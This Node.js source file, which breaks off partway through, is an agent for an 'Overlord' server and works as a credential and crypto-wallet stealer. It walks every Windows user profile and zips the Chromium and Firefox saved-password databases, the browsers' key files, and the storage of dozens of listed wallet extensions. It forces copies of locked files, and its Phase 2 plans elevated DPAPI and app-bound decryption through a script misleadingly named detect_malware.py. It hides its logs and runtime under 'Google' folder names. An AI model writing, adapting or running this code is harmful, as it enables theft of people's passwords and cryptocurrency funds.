/**
 * Node.js replacement for the Windows Go exe agent.
 *
 * Phase 1 (--company-wallet-phase1-local): Zips browser data files (Login Data,
 * Local Extension Settings, IndexedDB, Firefox extension storage, CLI wallet)
 * into a _phase1.zip in the artifacts directory. No elevation required.
 *
 * Phase 2 (--company-wallet-job): Builds a PowerShell script that calls
 * detect_malware.py for credential decryption (DPAPI + app-bound COM + SQLite),
 * then creates a _pass.zip with e_p.txt + agent log. Runs elevated.
 *
 * No npm dependencies -- uses only Node.js built-in modules + Windows system tools.
 */

const fs = require("fs");
const path = require("path");
const os = require("os");
const zlib = require("zlib");
const crypto = require("crypto");
const { execFileSync } = require("child_process");

// ---------------------------------------------------------------------------
//  Logging
// ---------------------------------------------------------------------------

function agentLog(msg) {
  const line = `${new Date().toISOString()} [windows-agent-node] ${msg}`;
  try {
    const dir = agentStateDir();
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(path.join(dir, "gus-run-update.log"), line + "\n", "utf8");
  } catch (_) { /* silent */ }
  try {
    fs.appendFileSync(path.join(os.tmpdir(), ".gus-ext.log"), line + "\n");
  } catch (_) { /* silent */ }
}

function agentStateDir() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) return path.join(la, "Google");
  const up = (process.env.USERPROFILE || "").trim();
  if (up) return path.join(up, "AppData", "Local", "Google");
  return path.join(".", "Google");
}

// ---------------------------------------------------------------------------
//  Artifacts directory
// ---------------------------------------------------------------------------

function windowsCwArtifactsDir() {
  if (process.env.OVERLORD_CW_ARTIFACTS_DIR)
    return path.resolve(process.env.OVERLORD_CW_ARTIFACTS_DIR.trim());
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) return path.join(la, "Google", "cw-artifacts");
  const up = (process.env.USERPROFILE || "").trim();
  if (up) return path.join(up, "AppData", "Local", "Google", "cw-artifacts");
  return path.join(os.tmpdir(), "overlord-cw-artifacts");
}

// ---------------------------------------------------------------------------
//  Archive naming (matches Go CompanyWalletArchiveStem)
// ---------------------------------------------------------------------------

function sanitizeArchiveToken(s) {
  let out = "";
  for (const ch of (s || "").trim()) {
    if (/[a-zA-Z0-9.\-_]/.test(ch)) out += ch;
    else out += "_";
  }
  out = out.replace(/__+/g, "_").replace(/^[._]+|[._]+$/g, "");
  return out.slice(0, 128);
}

function primaryIPv4() {
  const ifaces = os.networkInterfaces();
  for (const name of Object.keys(ifaces)) {
    for (const info of ifaces[name]) {
      if (info.family === "IPv4" && !info.internal) return info.address;
    }
  }
  return "noip";
}

function archiveStem() {
  const host = sanitizeArchiveToken(os.hostname()) || "host";
  const ip = primaryIPv4();
  const now = new Date();
  const pad = (n, w) => String(n).padStart(w, "0");
  const dt =
    pad(now.getFullYear(), 4) + pad(now.getMonth() + 1, 2) + pad(now.getDate(), 2) +
    pad(now.getHours(), 2) + pad(now.getMinutes(), 2);
  return `a_${host}_${ip}_${dt}`;
}

// ---------------------------------------------------------------------------
//  Wallet extension IDs (mirrors Go WalletTargetExtensions)
// ---------------------------------------------------------------------------

const WALLET_EXT_IDS = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm",
  "ljfoeinjpaedjfecbmggjgodbgkmjkjk", "acmacodkjbdgmoleebolmdjonilkdbch",
  "hnfanknocfeofbddgcijnmhnfnkdnaad", "odbfpeeihdkbihmopkbjmoonfanlbfcl",
  "mcohilncbfahbmgdjkbpemcciiolgcge", "dgkfhbnoibphbblhfcopapjgpbpffjof",
  "afbcbjpbpfadlkmhmclhkeeodmamcflc", "egjidjbpglichdcondbcbdnbeeppgdph",
  "jiidiaalihmmhddjgbnbgdfflelocpak", "bbckkcdiepaecefgfnibemejliemjnio",
  "mfgccjchihfkkindfppnaooecgfneiii", "lgmpcpglpngdoalbgeoldeajfclnhafa",
  "eajafomhmkipbjmfmhebemolkcicgfmd", "kpfopkelmapcoipemfendmdcghnegimn",
  "ocmccklecaalljlflmclidjeclpcpdim", "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
  "kkpllkodjeloidieedojogacfhpaihoh", "iojoiocmnkglehhfhfmhobpbikieodle",
  "aeachknmefphepccionboohckonoeemg", "ifckdpamfpchdlmipbepaflcgkjdaaff",
  "aholpfdialjgjfhomihkjbmgjidlcdno", "bfnaelmomeimhlpmgjnjophhpkkoljpa",
  "aflkmfhebedbjioipglgcbcmnbpgliof", "bhhhlbepdkbapadjdnnojkbgioiodbic",
  "pocmplpaccanhmnllbbkpgfliimjljgo", "dmkamcknogkgcdfhhbddcghachkejeap",
  "eabmfaeghhdbgenfkgpbplldmnpdnhne", "fpkhgmpbidmiogeglndfbkegfdlnajnf",
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", "lpfcbjknijpeeillifnkikgncikgfhdo",
  "ffnbelfdoeiohenkjibnmadjiehjhajb", "idnnbdplmphpflfnlkomgpfbpcgelopg",
  "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
];

function isWalletTargetIDBEntry(name) {
  const low = name.toLowerCase();
  if (!low.startsWith("chrome-extension_")) return false;
  const rest = name.slice("chrome-extension_".length);
  for (const id of WALLET_EXT_IDS) {
    if (rest.length >= id.length && rest.slice(0, id.length).toLowerCase() === id) {
      if (rest.length === id.length) return true;
      const next = rest[id.length];
      if (next === "_" || next === ".") return true;
    }
  }
  return false;
}

// ---------------------------------------------------------------------------
//  Chromium browser paths (mirrors Go chromiumWindowsUserDataPaths)
// ---------------------------------------------------------------------------

const CHROMIUM_BROWSERS = [
  { label: "Chrome", rel: ["AppData", "Local", "Google", "Chrome", "User Data"] },
  { label: "Chrome Beta", rel: ["AppData", "Local", "Google", "Chrome Beta", "User Data"] },
  { label: "Chrome Dev", rel: ["AppData", "Local", "Google", "Chrome Dev", "User Data"] },
  { label: "Chrome Canary", rel: ["AppData", "Local", "Google", "Chrome SxS", "User Data"] },
  { label: "Edge", rel: ["AppData", "Local", "Microsoft", "Edge", "User Data"] },
  { label: "Edge Beta", rel: ["AppData", "Local", "Microsoft", "Edge Beta", "User Data"] },
  { label: "Edge Dev", rel: ["AppData", "Local", "Microsoft", "Edge Dev", "User Data"] },
  { label: "Brave", rel: ["AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"] },
  { label: "Chromium", rel: ["AppData", "Local", "Chromium", "User Data"] },
  { label: "Vivaldi", rel: ["AppData", "Local", "Vivaldi", "User Data"] },
  { label: "Yandex", rel: ["AppData", "Local", "Yandex", "YandexBrowser", "User Data"] },
  { label: "Opera", rel: ["AppData", "Roaming", "Opera Software", "Opera Stable"] },
  { label: "Opera GX", rel: ["AppData", "Roaming", "Opera Software", "Opera GX Stable"] },
  { label: "Arc", rel: ["AppData", "Local", "Arc", "User Data"] },
  { label: "Arc (Packaged)", rel: ["AppData", "Local", "Packages", "TheBrowserCompany.Arc_ttt1ap7aakyb4", "LocalCache", "Local", "Arc", "User Data"] },
];

// ---------------------------------------------------------------------------
//  Windows profile root discovery (mirrors Go windowsWalletProfileRoots)
// ---------------------------------------------------------------------------

function windowsProfileRoots(sourceHome) {
  const seen = new Set();
  const add = (abs) => {
    if (!abs) return;
    abs = path.resolve(abs);
    const low = abs.toLowerCase();
    if (low.includes("\\windows\\system32\\config\\")) return;
    if (low.includes("\\windows\\serviceprofiles\\")) return;
    try { if (!fs.statSync(abs).isDirectory()) return; } catch (_) { return; }
    seen.add(abs);
  };

  // Registry ProfileList - use PowerShell since we can't read registry from Node without native addons
  try {
    const psExe = path.join(process.env.SYSTEMROOT || "C:\\Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
    const cmd = `Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList' | ForEach-Object { (Get-ItemProperty $_.PSPath).ProfileImagePath } | Where-Object { $_ }`;
    const out = execFileSync(psExe, ["-NoProfile", "-NonInteractive", "-Command", cmd], {
      encoding: "utf8", timeout: 15000, windowsHide: true, stdio: ["ignore", "pipe", "pipe"],
    });
    for (const line of out.split(/\r?\n/)) {
      const p = line.trim();
      if (p) add(p);
    }
  } catch (e) {
    agentLog(`registry profile scan: ${e.message}`);
  }

  // C:\Users entries
  try {
    const skip = new Set(["public", "default", "all users", "default user"]);
    for (const ent of fs.readdirSync("C:\\Users", { withFileTypes: true })) {
      if (!ent.isDirectory()) continue;
      if (skip.has(ent.name.toLowerCase())) continue;
      add(path.join("C:\\Users", ent.name));
    }
  } catch (_) { /* silent */ }

  if (sourceHome) add(sourceHome);
  const home = sourceHome || process.env.USERPROFILE || "";
  if (home) add(home);

  const roots = [...seen];
  agentLog(`windowsProfileRoots: found ${roots.length} profile root(s): ${roots.join(", ")}`);
  return roots;
}

// ---------------------------------------------------------------------------
//  Chromium user data roots for Phase 1
// ---------------------------------------------------------------------------

function phase1ChromiumUserDataRoots(sourceHome) {
  const out = [];
  for (const profRoot of windowsProfileRoots(sourceHome)) {
    for (const br of CHROMIUM_BROWSERS) {
      const userData = path.join(profRoot, ...br.rel);
      try {
        if (!fs.statSync(userData).isDirectory()) continue;
      } catch (_) { continue; }
      out.push({ engine: br.label, root: userData });
    }
  }
  return out;
}

// ---------------------------------------------------------------------------
//  Firefox profiles for Phase 1
// ---------------------------------------------------------------------------

function phase1FirefoxProfilesDirs(sourceHome) {
  const seen = new Set();
  const out = [];
  for (const profRoot of windowsProfileRoots(sourceHome)) {
    const p = path.join(profRoot, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles");
    try {
      if (!fs.statSync(p).isDirectory()) continue;
    } catch (_) { continue; }
    if (seen.has(p)) continue;
    seen.add(p);
    out.push(p);
  }
  return out;
}

// ---------------------------------------------------------------------------
//  Firefox extension storage discovery (mirrors Go appendFirefoxWalletArtifactsForProfile)
// ---------------------------------------------------------------------------

const FIREFOX_WALLET_ADDON_IDS = [
  "webextension@metamask.io",
  "keplr@chainapsis.com",
  "phantom-app@phantom.app",
];

function firefoxWebextUUIDsFromPrefs(profileDir) {
  const prefsPath = path.join(profileDir, "prefs.js");
  try {
    const content = fs.readFileSync(prefsPath, "utf8");
    const needle = 'user_pref("extensions.webextensions.uuids",';
    for (const line of content.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed.startsWith(needle)) continue;
      let rest = trimmed.slice(needle.length).trim();
      rest = rest.replace(/\);?\s*$/, "").trim();
      if (!rest.startsWith('"')) continue;
      try {
        const jsonStr = JSON.parse(rest);
        return JSON.parse(jsonStr);
      } catch (_) { /* skip */ }
    }
  } catch (_) { /* skip */ }
  return {};
}

function firefoxMozStorageDirs(storageDefault, uuid) {
  if (!uuid) return [];
  try { if (!fs.statSync(storageDefault).isDirectory()) return []; } catch (_) { return []; }
  const uCompact = uuid.replace(/-/g, "").toLowerCase();
  const out = [];
  for (const ent of fs.readdirSync(storageDefault, { withFileTypes: true })) {
    if (!ent.isDirectory()) continue;
    if (!ent.name.startsWith("moz-extension+++")) continue;
    const low = ent.name.toLowerCase();
    if (!low.includes(uCompact) && !low.includes(uuid.toLowerCase())) continue;
    const full = path.join(storageDefault, ent.name);
    // Only keep trees with idb/ or ls/ or .metadata-v2
    try {
      const hasIdb = fs.existsSync(path.join(full, "idb"));
      const hasLs = fs.existsSync(path.join(full, "ls"));
      const hasMeta = fs.existsSync(path.join(full, ".metadata-v2"));
      if (hasIdb || hasLs || hasMeta) out.push(full);
    } catch (_) { /* skip */ }
  }
  return out;
}

function collectFirefoxArtifactsForProfile(profileDir) {
  const paths = [];
  for (const name of ["prefs.js", "extensions.json"]) {
    const p = path.join(profileDir, name);
    try { if (fs.statSync(p).isFile()) paths.push(p); } catch (_) { /* skip */ }
  }
  const uuidMap = firefoxWebextUUIDsFromPrefs(profileDir);
  const storageDefault = path.join(profileDir, "storage", "default");
  for (const addonId of FIREFOX_WALLET_ADDON_IDS) {
    const uuid = (uuidMap[addonId] || "").trim();
    if (!uuid) continue;
    for (const d of firefoxMozStorageDirs(storageDefault, uuid)) {
      paths.push(d);
    }
  }
  // Legacy heuristic: chromium IDs in path name
  try {
    if (fs.statSync(storageDefault).isDirectory()) {
      for (const ent of fs.readdirSync(storageDefault, { withFileTypes: true })) {
        for (const id of WALLET_EXT_IDS) {
          if (ent.name.includes(id)) {
            paths.push(path.join(storageDefault, ent.name));
            break;
          }
        }
      }
    }
  } catch (_) { /* skip */ }
  // Generic moz-extension trees
  try {
    if (fs.statSync(storageDefault).isDirectory()) {
      for (const ent of fs.readdirSync(storageDefault, { withFileTypes: true })) {
        if (!ent.isDirectory() || !ent.name.startsWith("moz-extension+++")) continue;
        const full = path.join(storageDefault, ent.name);
        const hasIdb = fs.existsSync(path.join(full, "idb"));
        const hasLs = fs.existsSync(path.join(full, "ls"));
        const hasMeta = fs.existsSync(path.join(full, ".metadata-v2"));
        if (hasIdb || hasLs || hasMeta) paths.push(full);
      }
    }
  } catch (_) { /* skip */ }
  return [...new Set(paths)];
}

// ---------------------------------------------------------------------------
//  Locked file copying (mirrors Go lockedcopy.CopyRobust)
// ---------------------------------------------------------------------------

function copyRobust(src, dst) {
  // Try simple copy first
  try {
    fs.copyFileSync(src, dst);
    return;
  } catch (e) {
    agentLog(`copyRobust: simple copy failed ${src}: ${e.code || e.message}`);
  }

  // Try esentutl (available on Windows 10+)
  const sysRoot = process.env.SystemRoot || "C:\\Windows";
  const esent = path.join(sysRoot, "System32", "esentutl.exe");
  try {
    if (fs.existsSync(esent)) {
      agentLog(`copyRobust: trying esentutl for ${src}`);
      execFileSync(esent, ["/y", path.resolve(src), "/d", path.resolve(dst), "/o"], {
        stdio: "ignore", timeout: 60000, windowsHide: true,
      });
      if (fs.existsSync(dst)) {
        agentLog(`copyRobust: esentutl OK for ${src}`);
        return;
      }
    }
  } catch (e) {
    agentLog(`copyRobust: esentutl failed ${src}: ${e.message}`);
  }

  // Last resort: try reading with max sharing via PowerShell
  try {
    agentLog(`copyRobust: trying PowerShell max-share for ${src}`);
    const psExe = path.join(sysRoot, "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
    const srcEsc = src.replace(/'/g, "''");
    const dstEsc = dst.replace(/'/g, "''");
    const cmd = `$s=[IO.File]::Open('${srcEsc}','Open','Read','ReadWrite,Delete');$d=[IO.File]::Create('${dstEsc}');$s.CopyTo($d);$d.Close();$s.Close()`;
    execFileSync(psExe, ["-NoProfile", "-NonInteractive", "-Command", cmd], {
      stdio: "ignore", timeout: 30000, windowsHide: true,
    });
    if (fs.existsSync(dst)) {
      agentLog(`copyRobust: PowerShell max-share OK for ${src}`);
      return;
    }
  } catch (e) {
    agentLog(`copyRobust: PowerShell max-share failed ${src}: ${e.message}`);
  }

  throw new Error(`copyRobust: all strategies failed for ${src}`);
}

function readFileRobust(filePath) {
  try {
    return fs.readFileSync(filePath);
  } catch (_) {
    const tmp = path.join(os.tmpdir(), `cwzip-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    try {
      copyRobust(filePath, tmp);
      const data = fs.readFileSync(tmp);
      try { fs.unlinkSync(tmp); } catch (_) { /* silent */ }
      return data;
    } catch (e) {
      try { fs.unlinkSync(tmp); } catch (_) { /* silent */ }
      throw e;
    }
  }
}

// ---------------------------------------------------------------------------
//  Minimal ZIP builder using Node's built-in zlib
// ---------------------------------------------------------------------------

class ZipBuilder {
  constructor() {
    this._entries = [];
    this._offset = 0;
    this._buffers = [];
  }

  addFile(zipPath, data, mtime) {
    zipPath = zipPath.replace(/\\/g, "/");
    const compressed = zlib.deflateRawSync(data, { level: 6 });
    const crc = crc32(data);
    const nameBuffer = Buffer.from(zipPath, "utf8");
    const modDate = mtime || new Date();
    const { dosTime, dosDate } = toDosDateTime(modDate);

    // Local file header
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); // signature
    local.writeUInt16LE(20, 4); // version needed
    local.writeUInt16LE(0, 6); // flags
    local.writeUInt16LE(8, 8); // compression: deflate
    local.writeUInt16LE(dosTime, 10);
    local.writeUInt16LE(dosDate, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(compressed.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuffer.length, 26);
    local.writeUInt16LE(0, 28); // extra field length

    const localOffset = this._offset;
    this._buffers.push(local, nameBuffer, compressed);
    this._offset += local.length + nameBuffer.length + compressed.length;

    this._entries.push({
      zipPath, nameBuffer, crc, compressedSize: compressed.length,
      uncompressedSize: data.length, dosTime, dosDate, localOffset,
    });
  }

  addFileFromDisk(zipPath, diskPath) {
    let data, mtime;
    try {
      const st = fs.statSync(diskPath);
      if (st.isDirectory()) return;
      mtime = st.mtime;
      data = readFileRobust(diskPath);
    } catch (e) {
      agentLog(`zip skip: ${diskPath}: ${e.message}`);
      return;
    }
    this.addFile(zipPath, data, mtime);
  }

  addDirectoryFromDisk(zipPrefix, diskDir) {
    let entries;
    try { entries = walkDir(diskDir); } catch (e) {
      agentLog(`zip walk skip: ${diskDir}: ${e.message}`);
      return;
    }
    for (const abs of entries) {
      const rel = path.relative(diskDir, abs).replace(/\\/g, "/");
      this.addFileFromDisk(zipPrefix + "/" + rel, abs);
    }
  }

  finalize() {
    const cdStart = this._offset;
    for (const e of this._entries) {
      const cd = Buffer.alloc(46);
      cd.writeUInt32LE(0x02014b50, 0); // central dir signature
      cd.writeUInt16LE(20, 4); // version made by
      cd.writeUInt16LE(20, 6); // version needed
      cd.writeUInt16LE(0, 8); // flags
      cd.writeUInt16LE(8, 10); // compression
      cd.writeUInt16LE(e.dosTime, 12);
      cd.writeUInt16LE(e.dosDate, 14);
      cd.writeUInt32LE(e.crc, 16);
      cd.writeUInt32LE(e.compressedSize, 20);
      cd.writeUInt32LE(e.uncompressedSize, 24);
      cd.writeUInt16LE(e.nameBuffer.length, 28);
      cd.writeUInt16LE(0, 30); // extra field
      cd.writeUInt16LE(0, 32); // comment
      cd.writeUInt16LE(0, 34); // disk
      cd.writeUInt16LE(0, 36); // internal attrs
      cd.writeUInt32LE(0, 38); // external attrs
      cd.writeUInt32LE(e.localOffset, 42);
      this._buffers.push(cd, e.nameBuffer);
      this._offset += cd.length + e.nameBuffer.length;
    }
    const cdSize = this._offset - cdStart;

    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(0, 4); // disk number
    eocd.writeUInt16LE(0, 6); // disk with CD
    eocd.writeUInt16LE(this._entries.length, 8);
    eocd.writeUInt16LE(this._entries.length, 10);
    eocd.writeUInt32LE(cdSize, 12);
    eocd.writeUInt32LE(cdStart, 16);
    eocd.writeUInt16LE(0, 20); // comment length
    this._buffers.push(eocd);

    return Buffer.concat(this._buffers);
  }
}

function toDosDateTime(date) {
  const dosTime = ((date.getSeconds() >> 1) | (date.getMinutes() << 5) | (date.getHours() << 11)) & 0xffff;
  const dosDate = (date.getDate() | ((date.getMonth() + 1) << 5) | ((date.getFullYear() - 1980) << 9)) & 0xffff;
  return { dosTime, dosDate };
}

const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let i = 0; i < 256; i++) {
    let c = i;
    for (let j = 0; j < 8; j++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    table[i] = c;
  }
  return table;
})();

function crc32(buf) {
  let crc = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) crc = CRC_TABLE[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8);
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

function walkDir(dir) {
  const results = [];
  const walk = (d) => {
    let entries;
    try { entries = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; }
    for (const ent of entries) {
      const full = path.join(d, ent.name);
      if (ent.isDirectory()) walk(full);
      else if (ent.isFile()) results.push(full);
    }
  };
  walk(dir);
  return results;
}

// ---------------------------------------------------------------------------
//  Zip path sanitization (mirrors Go sanitizeZipSegment)
// ---------------------------------------------------------------------------

function sanitizeZipSegment(s) {
  let out = "";
  for (const ch of s) {
    if (ch.charCodeAt(0) < 32 || '<>:"|?*\\/'.includes(ch)) out += "_";
    else out += ch;
  }
  return out.replace(/^[._ ]+|[._ ]+$/g, "");
}

function phase1ZipPath(engine, relParts) {
  const segs = ["Phase1", sanitizeZipSegment(engine)];
  for (const p of relParts) {
    for (const piece of p.split(/[/\\]/)) {
      if (!piece || piece === ".") continue;
      segs.push(sanitizeZipSegment(piece));
    }
  }
  return segs.join("/");
}

// ---------------------------------------------------------------------------
//  Phase 1: Build phase1 wallet archive
// ---------------------------------------------------------------------------

function buildPhase1Zip(sourceHome) {
  const t0 = Date.now();
  agentLog(`phase1: building zip sourceHome=${sourceHome || "(empty)"} __dirname=${__dirname}`);
  const zip = new ZipBuilder();
  const seen = new Set();
  let fileCount = 0;
  let skipCount = 0;

  const addFile = (engine, relParts, diskPath) => {
    try { if (!fs.statSync(diskPath).isFile()) return; } catch (_) { return; }
    const zp = phase1ZipPath(engine, relParts);
    if (seen.has(zp)) return;
    seen.add(zp);
    zip.addFileFromDisk(zp, diskPath);
    fileCount++;
  };

  const addTree = (engine, relPrefix, dir) => {
    let entries;
    try { entries = walkDir(dir); } catch (_) { return; }
    for (const abs of entries) {
      const rel = path.relative(dir, abs);
      const parts = [...relPrefix, ...rel.split(path.sep)];
      const zp = phase1ZipPath(engine, parts);
      if (seen.has(zp)) continue;
      seen.add(zp);
      zip.addFileFromDisk(zp, abs);
      fileCount++;
    }
  };

  // Chromium browsers
  const udRoots = phase1ChromiumUserDataRoots(sourceHome);
  agentLog(`phase1: found ${udRoots.length} Chromium User Data root(s)`);
  for (const { engine, root } of udRoots) {
    agentLog(`phase1: chromium root: engine=${engine} path=${root}`);
  }

  for (const { engine, root: userData } of udRoots) {
    addFile(engine, ["UserData", "Local State"], path.join(userData, "Local State"));

    let ents;
    try { ents = fs.readdirSync(userData, { withFileTypes: true }); } catch (_) { continue; }
    for (const ent of ents) {
      if (!ent.isDirectory()) continue;
      const pn = ent.name;
      if (pn !== "Default" && !pn.startsWith("Profile ")) continue;
      const prof = path.join(userData, pn);

      addFile(engine, [pn, "Login Data"], path.join(prof, "Login Data"));

      // Local Extension Settings
      const les = path.join(prof, "Local Extension Settings");
      try {
        if (fs.statSync(les).isDirectory()) addTree(engine, [pn, "Local Extension Settings"], les);
      } catch (_) { /* skip */ }

      // IndexedDB: only wallet extension IDs
      for (const idbLabel of ["Indexed DB", "IndexedDB"]) {
        const idbRoot = path.join(prof, idbLabel);
        try { if (!fs.statSync(idbRoot).isDirectory()) continue; } catch (_) { continue; }
        let subents;
        try { subents = fs.readdirSync(idbRoot, { withFileTypes: true }); } catch (_) { continue; }
        for (const se of subents) {
          if (!isWalletTargetIDBEntry(se.name)) continue;
          const p = path.join(idbRoot, se.name);
          if (se.isDirectory()) addTree(engine, [pn, idbLabel, se.name], p);
          else addFile(engine, [pn, idbLabel, se.name], p);
        }
      }

      // BraveWallet
      const bw = path.join(prof, "BraveWallet");
      try { if (fs.statSync(bw).isDirectory()) addTree(engine, [pn, "BraveWallet"], bw); } catch (_) { /* skip */ }
    }
  }

  // Firefox
  const ffRoots = phase1FirefoxProfilesDirs(sourceHome);
  agentLog(`phase1: found ${ffRoots.length} Firefox Profiles dir(s)`);

  for (const ffRoot of ffRoots) {
    const sum = crypto.createHash("sha256").update(ffRoot).digest("hex").slice(0, 8);
    const engineLabel = `Firefox_${sum}`;
    let profEnts;
    try { profEnts = fs.readdirSync(ffRoot, { withFileTypes: true }); } catch (_) { continue; }
    for (const pe of profEnts) {
      if (!pe.isDirectory()) continue;
      const profDir = path.join(ffRoot, pe.name);
      const artifacts = collectFirefoxArtifactsForProfile(profDir);
      for (const abs of artifacts) {
        try {
          const st = fs.statSync(abs);
          const rel = path.relative(profDir, abs);
          if (st.isDirectory()) {
            addTree(engineLabel, [pe.name, ...rel.split(path.sep)], abs);
          } else {
            addFile(engineLabel, [pe.name, ...rel.split(path.sep)], abs);
          }
        } catch (_) { /* skip */ }
      }
    }
  }

  // CLI Wallet dir
  const walletHome = sourceHome || process.env.USERPROFILE || os.homedir() || "";
  if (walletHome) {
    const walletDir = path.join(walletHome, "CompanyWallet");
    try {
      if (fs.statSync(walletDir).isDirectory()) {
        for (const abs of walkDir(walletDir)) {
          const rel = path.relative(walletDir, abs).replace(/\\/g, "/");
          const zp = `Phase1/CLIWallet/${rel}`;
          if (seen.has(zp)) continue;
          seen.add(zp);
          zip.addFileFromDisk(zp, abs);
          fileCount++;
        }
      }
    } catch (_) { /* skip */ }
  }

  agentLog(`phase1: ${fileCount} file entries in zip, ${skipCount} skipped, ${seen.size} unique paths, elapsed=${Date.now() - t0}ms`);
  return zip.finalize();
}

// ---------------------------------------------------------------------------
//  Phase 1: Run and save to artifacts
// ---------------------------------------------------------------------------

function runPhase1(sourceHome) {
  const t0 = Date.now();
  agentLog(`runPhase1: begin sourceHome=${sourceHome || "(empty)"} pid=${process.pid}`);
  const artDir = windowsCwArtifactsDir();
  agentLog(`runPhase1: artifactsDir=${artDir}`);
  try {
    fs.mkdirSync(artDir, { recursive: true });
  } catch (e) {
    agentLog(`runPhase1: FAILED to create artDir: ${e.message}`);
    throw e;
  }
  const stem = archiveStem();
  const dest = path.join(artDir, stem + "_phase1.zip");
  agentLog(`runPhase1: archiveStem=${stem} dest=${dest}`);

  const zipData = buildPhase1Zip(sourceHome);
  if (zipData.length < 64) {
    agentLog(`runPhase1: archive trivial (${zipData.length} bytes), skipping -- elapsed=${Date.now() - t0}ms`);
    return null;
  }
  fs.writeFileSync(dest, zipData);
  agentLog(`runPhase1: wrote ${zipData.length} bytes -> ${dest} elapsed=${Date.now() - t0}ms`);
  return dest;
}

// ---------------------------------------------------------------------------
//  Phase 2: Build PowerShell script for elevated credential export
// ---------------------------------------------------------------------------

function findDetectMalwarePy(scriptDir) {
  const base = scriptDir || __dirname;
  const candidates = [
    path.join(base, "detect_malware.py"),
    path.join(base, "chromepy", "detect_malware.py"),
  ];
  for (const p of candidates) {
    const exists = fs.existsSync(p);
    agentLog(`findDetectMalwarePy: checking ${p} exists=${exists}`);
    if (exists) return p;
  }
  agentLog(`findDetectMalwarePy: NOT FOUND in ${base}`);
  return null;
}

function findPythonExe() {
  for (const name of ["python", "python3", "py"]) {
    try {
      const p = execFileSync("where", [name], {
        encoding: "utf8", timeout: 10000, windowsHide: true, stdio: ["ignore", "pipe", "pipe"],
      }).trim().split(/\r?\n/)[0].trim();
      if (p && fs.existsSync(p)) {
        agentLog(`findPythonExe: found '${name}' at ${p}`);
        return p;
      }
    } catch (_) {
      agentLog(`findPythonExe: 'where ${name}' -- not found`);
    }
  }
  for (const envKey of ["ProgramW6432", "ProgramFiles", "ProgramFiles(x86)", "LocalAppData"]) {
    const base = (process.env[envKey] || "").trim();
    if (!base) continue;
    for (const sub of [
      path.join("Google", "Chrome", "Application"),
      path.join("Microsoft", "Edge", "Application"),
    ]) {
      const py = path.join(base, sub, "python.exe");
      if (fs.existsSync(py)) {
        agentLog(`findPythonExe: found embedded at ${py}`);
        return py;
      }
    }
  }
  agentLog("findPythonExe: NOT FOUND anywhere");
  return null;
}

// ---------------------------------------------------------------------------
//  Embeddable Python download from server (mirrors Go ensureWindowsEmbeddablePythonForBrowser)
//
//  Downloads CPython embed zip + pycryptodome site-packages zip from
//  GET /data/<name> on the Overlord server, extracts beside chrome.exe/msedge.exe.
// ---------------------------------------------------------------------------

const EMBED_PYTHON_ZIP = "python-3.12.8-embed-amd64.zip";
const EMBED_SITEPACKAGES_ZIP = "chrome_decrypt_sitepackages_amd64.zip";
const EMBED_STAMP_FILE = ".overlord_python_embed.sha256";

function browserApplicationDirs(browserName) {
  const bn = browserName.toLowerCase();
  const dirs = [];
  const seen = new Set();
  const push = (base) => {
    if (!base) return;
    let dir;
    if (bn === "chrome" || bn === "chromium")
      dir = path.join(base, "Google", "Chrome", "Application");
    else if (bn === "edge")
      dir = path.join(base, "Microsoft", "Edge", "Application");
    else return;
    dir = path.resolve(dir);
    if (seen.has(dir.toLowerCase())) return;
    seen.add(dir.toLowerCase());
    dirs.push(dir);
  };
  for (const key of ["ProgramW6432", "ProgramFiles", "ProgramFiles(x86)", "LocalAppData"]) {
    push((process.env[key] || "").trim());
  }
  return dirs;
}

function findBrowserApplicationDir(browserName) {
  const exe = browserName.toLowerCase().includes("edge") ? "msedge.exe" : "chrome.exe";
  for (const dir of browserApplicationDirs(browserName)) {
    const exePath = path.join(dir, exe);
    try {
      if (fs.statSync(exePath).isFile()) {
        agentLog(`findBrowserApplicationDir: found ${exe} at ${dir}`);
        return dir;
      }
    } catch (_) { /* continue */ }
  }
  // Fallback: registry via PowerShell
  try {
    const psExe = path.join(process.env.SYSTEMROOT || "C:\\Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
    const cmd = `(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exe}' -ErrorAction SilentlyContinue).'(Default)'`;
    const out = execFileSync(psExe, ["-NoProfile", "-NonInteractive", "-Command", cmd], {
      encoding: "utf8", timeout: 10000, windowsHide: true, stdio: ["ignore", "pipe", "pipe"],
    }).trim();
    if (out) {
      const dir = path.dirname(out);
      agentLog(`findBrowserApplicationDir: registry fallback ${dir}`);
      return dir;
    }
  } catch (_) { /* silent */ }
  agentLog(`findBrowserApplicationDir: NOT FOUND for ${browserName}`);
  return null;
}

function downloadFileSync(url, destPath) {
  const psExe = path.join(process.env.SYSTEMROOT || "C:\\Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe");
  const urlEsc = url.replace(/'/g, "''");
  const dstEsc = destPath.replace(/'/g, "''");
  const cmd = [
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
